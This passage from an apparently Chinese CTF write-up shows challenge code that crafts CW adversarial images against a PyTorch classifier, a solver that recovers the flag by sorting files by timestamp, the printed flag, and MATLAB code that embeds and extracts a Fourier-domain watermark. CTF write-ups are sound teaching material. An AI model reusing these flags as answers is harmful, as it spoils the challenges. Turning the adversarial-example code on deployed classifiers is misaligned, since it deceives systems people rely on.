punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>pool<span class="token punctuation">(</span>F<span class="token punctuation">.</span>elu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv1<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>dropout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv1_bn<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>pool<span class="token punctuation">(</span>F<span class="token punctuation">.</span>elu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv2<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>dropout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv2_bn<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>pool<span class="token punctuation">(</span>F<span class="token punctuation">.</span>elu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv3<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>dropout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv3_bn<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> x<span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">250</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> F<span class="token punctuation">.</span>elu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc1<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>dropout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc1_bn<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>fc2<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">return</span> x<span class="token comment"># load pretrained model</span>device <span class="token operator">=</span> torch<span class="token punctuation">.</span>device<span class="token punctuation">(</span><span class="token string">"cuda:0"</span> <span class="token keyword">if</span> torch<span class="token punctuation">.</span>cuda<span class="token punctuation">.</span>is_available<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">"cpu"</span><span class="token punctuation">)</span>transform <span class="token operator">=</span> transforms<span class="token punctuation">.</span>ToTensor<span class="token punctuation">(</span><span class="token punctuation">)</span>model <span class="token operator">=</span> Model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>check_point <span class="token operator">=</span> torch<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">'model.pt'</span><span class="token punctuation">,</span> map_location<span class="token operator">=</span>device<span class="token punctuation">)</span>model<span class="token punctuation">.</span>load_state_dict<span class="token punctuation">(</span>check_point<span class="token punctuation">)</span>model<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># untargeted CW attack</span>atk <span class="token operator">=</span> torchattacks<span class="token punctuation">.</span>CW<span class="token punctuation">(</span>model<span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> kappa<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">)</span><span class="token comment"># generate an adversarial example for each class</span>pairs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> cl <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        origin_image <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>glob<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'test/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cl<span class="token punctuation">&#125;</span></span><span class="token string">/*.png'</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>        image <span class="token operator">=</span> transform<span class="token punctuation">(</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>origin_image<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>        label <span class="token operator">=</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span>cl<span class="token punctuation">,</span> device<span class="token operator">=</span>device<span class="token punctuation">)</span>        adv_image <span class="token operator">=</span> atk<span class="token punctuation">(</span>image<span class="token punctuation">,</span> label<span class="token punctuation">)</span>        origin_output <span class="token operator">=</span> model<span class="token punctuation">(</span>image<span class="token punctuation">)</span>        adv_output <span class="token operator">=</span> model<span class="token punctuation">(</span>adv_image<span class="token punctuation">)</span>        origin_label <span class="token operator">=</span> torch<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>origin_output<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span>        adv_label <span class="token operator">=</span> torch<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>adv_output<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> adv_label <span class="token operator">==</span> origin_label<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        transforms<span class="token punctuation">.</span>ToPILImage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>adv_image<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'adv_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>origin_label<span class="token punctuation">&#125;</span></span><span class="token string">_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>adv_label<span class="token punctuation">&#125;</span></span><span class="token string">.png'</span></span><span class="token punctuation">)</span>        <span class="token comment"># confirm that the generated adversarial example is working</span>        image <span class="token operator">=</span> transform<span class="token punctuation">(</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'adv_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>origin_label<span class="token punctuation">&#125;</span></span><span class="token string">_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>adv_label<span class="token punctuation">&#125;</span></span><span class="token string">.png'</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>        output <span class="token operator">=</span> model<span class="token punctuation">(</span>image<span class="token punctuation">)</span>        <span class="token keyword">if</span> torch<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>output<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> adv_label<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        pairs<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>origin_image<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'adv_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>origin_label<span class="token punctuation">&#125;</span></span><span class="token string">_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>adv_label<span class="token punctuation">&#125;</span></span><span class="token string">.png'</span></span><span class="token punctuation">,</span> origin_label<span class="token punctuation">,</span> adv_label<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token comment"># remove origin images and move adversarial examples into target classes</span><span class="token keyword">for</span> origin_fname<span class="token punctuation">,</span> adv_fname<span class="token punctuation">,</span> origin_label<span class="token punctuation">,</span> adv_label <span class="token keyword">in</span> pairs<span class="token punctuation">:</span>    os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span>adv_fname<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'test/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>adv_label<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>adv_fname<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>origin_fname<span class="token punctuation">)</span><span class="token comment"># shuffle all the images to hide adversarial examples</span>os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'imgs'</span><span class="token punctuation">)</span>adversarial_images <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> cl <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    images <span class="token operator">=</span> glob<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'test/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cl<span class="token punctuation">&#125;</span></span><span class="token string">/*.png'</span></span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'imgs/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cl<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>images<span class="token punctuation">)</span>    <span class="token keyword">for</span> idx<span class="token punctuation">,</span> image <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>images<span class="token punctuation">)</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span>image<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'imgs/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cl<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>idx<span class="token punctuation">&#125;</span></span><span class="token string">.png'</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'adv'</span> <span class="token keyword">in</span> image<span class="token punctuation">:</span>            adversarial_images<span class="token punctuation">.</span>append<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token comment"># You can get the flag if you find all the adversarial examples :)</span>flag <span class="token operator">=</span> <span class="token string">'flag&#123;'</span> <span class="token operator">+</span> md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>adversarial_images<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token comment"># Give you some hints though you can solve this challenge without them</span>hint1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> pairs<span class="token punctuation">]</span>hint2 <span class="token operator">=</span> sha256<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>adversarial_images<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag:'</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hint1:'</span><span class="token punctuation">,</span> hint1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hint2:'</span><span class="token punctuation">,</span> hint2<span class="token punctuation">)</span><span class="token comment"># flag: flag&#123;*********REDACTED**********&#125;</span><span class="token comment"># hint1: [(0, 1), (1, 0), (2, 6), (3, 4), (4, 3), (5, 6), (6, 5), (7, 8), (8, 7), (9, 1)]</span><span class="token comment"># hint2: 502e0423b82c251f280e4c3261ee4d01dca4f6fe0b663817e9fd43dffefc5ce9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到拿pytorch搭建了一个模型，然后生成对抗样本，接着把这些样本放到模型的分类中去，然后将样本保存，改名然后删掉原图</p><p>因为修改文件名的原因，我们要找的样本都是后面重新保存的，所以和其他文件的生成时间不一样，把这些图片按照时间排序就能找到这些样本了</p><p>当然这肯定是一种投机取巧的方法了，正确的解法太复杂，我目前的水平还理解不了</p><p>找到样本后问题就迎刃而解了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5<span class="token punctuation">,</span> sha256adversarial_images <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">273</span><span class="token punctuation">,</span> <span class="token number">293</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">391</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">]</span>hint2 <span class="token operator">=</span> sha256<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>adversarial_images<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hint2:'</span><span class="token punctuation">,</span> hint2<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">'flag&#123;'</span> <span class="token operator">+</span> md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>adversarial_images<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag:'</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag{00d531934c171e1a71405f5e1f171d65}</p><h2 id="snowww"><a href="#snowww" class="headerlink" title="snowww"></a>snowww</h2><p>分析这张图片后发现最后藏了一个rar的压缩包</p><p>foremost直接把压缩包提取出来</p><p>里边有用matlab写的代码，由于没接触过matlab，里面很多代码都看不懂</p><p>这里找到一位大神写的注释</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"># 作者<span class="token punctuation">(</span>Author<span class="token punctuation">)</span>：Snowywar# 链接<span class="token punctuation">(</span>URL<span class="token punctuation">)</span>：http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>snowywar<span class="token punctuation">.</span>top<span class="token operator">/</span>wordpress<span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">/</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">01</span><span class="token operator">/</span><span class="token number">31</span><span class="token operator">/</span>ichunqiu<span class="token operator">-</span>write<span class="token operator">-</span>up<span class="token operator">/</span><span class="token comment">%% Run on Matlab2012b </span>clc<span class="token punctuation">;</span>clear<span class="token punctuation">;</span>close all<span class="token punctuation">;</span>alpha <span class="token operator">=</span> <span class="token number">80</span><span class="token punctuation">;</span>im <span class="token operator">=</span> <span class="token function">double</span><span class="token punctuation">(</span><span class="token function">imread</span><span class="token punctuation">(</span><span class="token string">'original.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">255</span><span class="token punctuation">;</span>mark <span class="token operator">=</span> <span class="token function">double</span><span class="token punctuation">(</span><span class="token function">imread</span><span class="token punctuation">(</span><span class="token string">'watermark.png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">255</span><span class="token punctuation">;</span>imsize <span class="token operator">=</span> <span class="token function">size</span><span class="token punctuation">(</span>im<span class="token punctuation">)</span><span class="token punctuation">;</span>TH<span class="token operator">=</span><span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>TH1 <span class="token operator">=</span> TH<span class="token punctuation">;</span><span class="token function">TH1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">size</span><span class="token punctuation">(</span>mark<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">size</span><span class="token punctuation">(</span>mark<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span> <span class="token operator">=</span> mark<span class="token punctuation">;</span>M<span class="token operator">=</span><span class="token function">randperm</span><span class="token punctuation">(</span><span class="token number">0.5</span><span class="token operator">*</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">%%获得1080的一半长度的随机数组，0-540个随机数，共540</span>N<span class="token operator">=</span><span class="token function">randperm</span><span class="token punctuation">(</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">%%共1920个随机数，0-1920</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token string">'encode.mat'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">%%m、n存入encode.mat</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span>                       <span class="token comment">%%循环，1到540循环共540次</span>    <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                       <span class="token comment">%%1-1920循环</span>         <span class="token function">TH</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">TH1</span><span class="token punctuation">(</span><span class="token function">M</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">N</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">%%意义不明的赋值</span>    <span class="token keyword">end</span><span class="token keyword">end</span>mark_ <span class="token operator">=</span> <span class="token function">zeros</span><span class="token punctuation">(</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">%%创建1080 1920 3的全0矩阵</span><span class="token function">mark_</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">=</span>TH<span class="token punctuation">;</span>    <span class="token comment">%%TH赋值给三维矩阵</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span>                          <span class="token comment">%%1-540</span>    <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                          <span class="token comment">%%1-1920</span>        <span class="token function">mark_</span><span class="token punctuation">(</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">TH</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">%%再次复制，怪</span>    <span class="token keyword">end</span><span class="token keyword">end</span>FA<span class="token operator">=</span><span class="token function">fft2</span><span class="token punctuation">(</span>im<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token comment">%%对im进行傅里叶变换</span>FB<span class="token operator">=</span>FA<span class="token operator">+</span>alpha<span class="token operator">*</span><span class="token function">double</span><span class="token punctuation">(</span>mark_<span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">%%傅里叶+80*double（mark_)</span>FAO<span class="token operator">=</span><span class="token function">ifft2</span><span class="token punctuation">(</span>FB<span class="token punctuation">)</span><span class="token punctuation">;</span>                                  <span class="token comment">%%在进行逆变换</span><span class="token function">imwrite</span><span class="token punctuation">(</span>FAO<span class="token punctuation">,</span><span class="token string">'snow.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">%%最后导出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"># 作者<span class="token punctuation">(</span>Author<span class="token punctuation">)</span>：Snowywar# 链接<span class="token punctuation">(</span>URL<span class="token punctuation">)</span>：http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>snowywar<span class="token punctuation">.</span>top<span class="token operator">/</span>wordpress<span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">/</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">01</span><span class="token operator">/</span><span class="token number">31</span><span class="token operator">/</span>ichunqiu<span class="token operator">-</span>write<span class="token operator">-</span>up<span class="token operator">/</span>clc<span class="token punctuation">;</span>clear<span class="token punctuation">;</span>close all<span class="token punctuation">;</span>alpha <span class="token operator">=</span> <span class="token number">80</span><span class="token punctuation">;</span>im <span class="token operator">=</span> <span class="token function">double</span><span class="token punctuation">(</span><span class="token function">imread</span><span class="token punctuation">(</span><span class="token string">'original.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">255</span><span class="token punctuation">;</span>FAO <span class="token operator">=</span> <span class="token function">double</span><span class="token punctuation">(</span><span class="token function">imread</span><span class="token punctuation">(</span><span class="token string">'snow.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">255</span><span class="token punctuation">;</span>FA <span class="token operator">=</span> <span class="token function">fft2</span><span class="token punctuation">(</span>im<span class="token punctuation">)</span><span class="token punctuation">;</span>imsize <span class="token operator">=</span> <span class="token function">size</span><span class="token punctuation">(</span>im<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token string">'encode.mat'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>FA2<span class="token operator">=</span><span class="token function">fft2</span><span class="token punctuation">(</span>FAO<span class="token punctuation">)</span><span class="token punctuation">;</span>G<span class="token operator">=</span><span class="token punctuation">(</span>FA2<span class="token operator">-</span>FA<span class="token punctuation">)</span><span class="token operator">/</span>alpha<span class="token punctuation">;</span>GG<span class="token operator">=</span>G<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span>    <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token function">GG</span><span class="token punctuation">(</span><span class="token function">M</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">N</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">G</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.5</span>    <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token function">GG</span><span class="token punctuation">(</span><span class="token function">imsize</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token 